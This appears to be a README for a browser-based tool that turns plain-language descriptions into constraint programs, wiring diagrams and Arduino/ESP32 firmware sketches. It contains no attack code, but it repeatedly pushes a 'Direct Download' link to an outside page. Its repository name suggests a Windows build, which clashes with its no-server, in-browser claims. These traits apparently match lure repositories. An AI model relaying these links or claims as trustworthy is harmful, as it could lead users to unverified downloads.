# Describe Your Device v2026 - browser-based prototype 2026

> **Describe Your Device is a web-based prototyping tool that turns natural language into constraint programs, wiring diagrams, browser simulation, and downloadable firmware sketches for Arduino and ESP32.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adrian-bennett95/describe-device-win-19232?style=flat-square)](https://github.com/adrian-bennett95/describe-device-win-19232)

---

<p align="center">
  <a href="https://adrian-bennett95.github.io/describe-device-win-19232/">
    <img src="https://img.shields.io/badge/Download-Describe%20Your%20Device%20Latest-brightgreen?style=for-the-badge" alt="Download Describe Your Device">
  </a>
</p>

> **[Direct Download - Describe Your Device v2026](https://adrian-bennett95.github.io/describe-device-win-19232/)**

---

[Download Latest Build](https://adrian-bennett95.github.io/describe-device-win-19232/)

---

## About Describe Your Device

Describe Your Device is a browser-based prototyping environment built for turning plain-language ideas into structured device models. It uses constraint programming with a CSP solver approach to help define system behavior, check constraints, and move from a rough concept to a more formal design workflow.

It is aimed at makers, embedded developers, and hardware tinkerers working with Arduino and ESP32 projects. The tool brings together wiring diagram generation, simulation, and firmware sketch export in one web workflow, so you can iterate on device ideas without depending on a server-side backend.

---

## Features

- Natural language input that converts ideas into a constraint program
- Constraint verification powered by AC-3
- SVG wiring diagram generation for visual hardware layouts
- Browser-based simulation for quick device checks
- Downloadable firmware sketch output for embedded targets
- Support for Arduino-oriented and ESP32-oriented prototyping flows
- No server required, so the core experience runs in the browser
- Built around PLATO prototyping concepts and constraint-solving workflows

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/adrian-bennett95/describe-device-win-19232.git
2. Open the project in a browser-based environment or serve the files locally.
3. Launch the main HTML entry point in your browser.

If you are hosting it locally, a simple static server is enough for first use:
- `python -m http.server`

Then open the local address shown by the server and start describing your device.

---

## Usage

1. Open the app in your browser.
2. Enter a plain-language description of the device you want to prototype.
3. Review the generated constraint program and verify the model.
4. Inspect the wiring diagram and simulation output.
5. Export the firmware sketch when the design is ready.

Typical workflow:
- Describe the device
- Validate constraints
- Check the wiring layout
- Run the simulation
- Download the generated sketch

---

## Configuration

Most settings are handled in the browser session or through project files loaded by the app.

If you need to adjust behavior, look for the main HTML and related client-side assets in the repository. For local hosting, configuration usually comes from the static environment rather than a backend service.

Example structure:

    settings:
      mode: browser
      solver: AC-3
      target: arduino
      output: firmware sketch

---

## Requirements

- A modern web browser
- Local static hosting if you want to run it outside a hosted page
- Enough browser memory for interactive simulation and diagram rendering
- An environment suitable for Arduino or ESP32 sketch use if you plan to build the exported firmware

---

## FAQ

### Does it need a server?
No. The tool is designed to work without a server in the core browser flow.

### Can I use it for Arduino and ESP32?
Yes. The feature set includes firmware sketch generation for embedded device workflows such as Arduino and ESP32.

### Where do I update the tool?
Use the latest repository release or the hosted download link, then refresh your local copy if you are running it yourself.

### What if the wiring diagram or simulation looks wrong?
Check the natural-language description and constraint assumptions first. Small wording changes can affect the generated model and downstream outputs.

### Where are settings stored?
Configuration is generally handled in the browser or in the project files served with the app.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
